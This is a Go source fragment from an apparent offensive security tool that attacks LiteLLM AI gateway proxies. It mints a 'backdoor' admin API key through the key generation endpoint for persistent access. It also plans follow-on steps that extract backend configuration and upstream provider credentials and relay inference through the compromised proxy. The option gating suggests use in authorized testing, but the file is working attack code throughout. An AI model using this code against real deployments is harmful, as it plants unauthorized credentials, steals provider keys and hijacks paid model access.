			target+"/key/new", headers, payload, &response,
		)
	}

	if postErr != nil {
		return fmt.Errorf("key generation failed: %w", postErr)
	}

	// Extract the generated key from the response.
	generatedKey := ""
	if response != nil {
		if k, ok := response["key"].(string); ok {
			generatedKey = k
		} else if k, ok := response["token"].(string); ok {
			generatedKey = k
		}
	}

	rawJSON, _ := json.Marshal(response)
	evidence := fmt.Sprintf("POST /key/generate -> %d\nKey alias: aipostex-proof\n", statusCode)
	if generatedKey != "" {
		evidence += fmt.Sprintf("Generated key: %s...%s\n", generatedKey[:min(8, len(generatedKey))], generatedKey[max(0, len(generatedKey)-4):])
	}
	if len(body) > 0 {
		evidence += fmt.Sprintf("Response: %s", truncateBytes(rawJSON, 512))
	}

	severity := report.SeverityCritical
	desc := "Generated backdoor API key via admin endpoint. Key alias: aipostex-proof. This proves admin-level write access to the LiteLLM proxy and creates a persistent credential."
	if generatedKey == "" {
		severity = report.SeverityHigh
		desc = fmt.Sprintf("Admin key endpoint accepted the request (HTTP %d) but no key was returned in the response. Partial admin access confirmed.", statusCode)
	}

	finding := newExploitFinding(
		report.SourceLiteLLM,
		litellmTarget,
		fmt.Sprintf("LiteLLM admin key generation: %s", litellmTarget),
		severity,
		desc,
		map[string]interface{}{
			"module":      "litellm",
			"action":      "key-gen",
			"mutating":    true,
			"provider":    "litellm",
			"status_code": statusCode,
			"key_alias":   "aipostex-proof",
			"key_present": generatedKey != "",
		},
	)
	finding.Evidence = evidence
	// Minting an admin API key is a WRITE (influenced), not code execution. It becomes
	// takeover-capable only once the minted key is REPLAYED to prove usable access.
	finding.Metadata = applyStageLanded(finding.Metadata, "impact", "influenced", "litellm-key-gen", "credential")

	keyPlan := buildLiteLLMExploitWorkflowPlan(litellmTarget, "key-gen", generatedKey)
	finding.Metadata = attachWorkflowToMetadata(finding.Metadata, keyPlan)

	infof("Key generation succeeded: target=%s status=%d key_present=%t", litellmTarget, statusCode, generatedKey != "")
	return writeExploitFindingsWithSummary([]report.Finding{finding}, &exploitSummary{
		Module:              "litellm",
		Action:              "key-gen",
		ResourcesEnumerated: 1,
		Mutating:            true,
		WorkflowPlans:       []workflowPlan{keyPlan},
	})
}

// buildLiteLLMExploitWorkflowPlan emits follow-ons for the litellm gateway verbs,
// chaining each to an existing verb that deepens what it found: config/credential
// extraction, backend relay, and admin-key minting. Only key-gen is --force-exploit
// gated. mintedKey is the admin key returned by key-gen ("" otherwise); when present
// it is threaded into the follow-on --api-key so the operator keeps the credential.
func buildLiteLLMExploitWorkflowPlan(target, action, mintedKey string) workflowPlan {
	target = canonicalServiceURL(target)
	base := "litellm --target " + target + " "
	keyArg := ""
	if mintedKey != "" {
		keyArg = " --api-key " + shellSafeArg(mintedKey)
	}
	var rationale string
	var recs []workflowRecommendation
	switch action {
	case "config-extract":
		rationale = "Extracted backend configuration and credentials anchor admin-key generation and backend relay abuse."
		recs = []workflowRecommendation{
			newWorkflowRecommendation(formatCommandExample(base+"key-gen --force-exploit"), "Mint an admin API key if /key/generate is unauthenticated (persistent credential).", true, 10),
			newWorkflowRecommendation(formatCommandExample(base+"proxy-chain"), "Relay inference through the discovered upstream providers.", false, 20),
		}
	case "budget-probe":
		rationale = "Exposed budget/rate-limit data confirms model-info access; deepen into full config extraction and admin-key generation."
		recs = []workflowRecommendation{
			newWorkflowRecommendation(formatCommandExample(base+"config-extract"), "Extract full backend configuration and embedded credentials from model-info.", false, 10),
			newWorkflowRecommendation(formatCommandExample(base+"key-gen --force-exploit"), "Mint an admin API key if the key endpoint is unauthenticated.", true, 20),
		}
	case "proxy-chain":
		rationale = "Backend relay succeeded; extract the upstream credentials it relayed through and mint an admin key for persistence."
		recs = []workflowRecommendation{
			newWorkflowRecommendation(formatCommandExample(base+"config-extract"), "Extract the upstream provider credentials the relay used.", false, 10),
			newWorkflowRecommendation(formatCommandExample(base+"key-gen --force-exploit"), "Mint an admin API key for persistent access.", true, 20),
		}
	case "key-gen":
		rationale = "An admin key was minted; use it to relay inference and read the full backend configuration."
		recs = []workflowRecommendation{
			newWorkflowRecommendation(formatCommandExample(base+"proxy-chain"+keyArg), "Relay inference through the proxy using the minted admin key.", false, 10),
			newWorkflowRecommendation(formatCommandExample(base+"config-extract"+keyArg), "Read the full backend configuration authenticated as the minted admin key.", false, 20),
			newWorkflowRecommendation(formatCommandExample("report view <dossier-dir> --credentials"), "Review the minted key and extracted upstream credentials from your engagement dossier — save runs with --format dossier -o <dir>.", false, 30),
		}
	default:
		return workflowPlan{}
	}
	return workflowPlan{
		Target:          target,
		Stage:           "impact",
		ChainSource:     "litellm-" + action,
		Rationale:       rationale,
		Recommendations: recs,
	}
}

func truncateBytes(b []byte, n int) string {
	if len(b) <= n {
		return string(b)
	}
	return string(b[:n]) + "..."
}
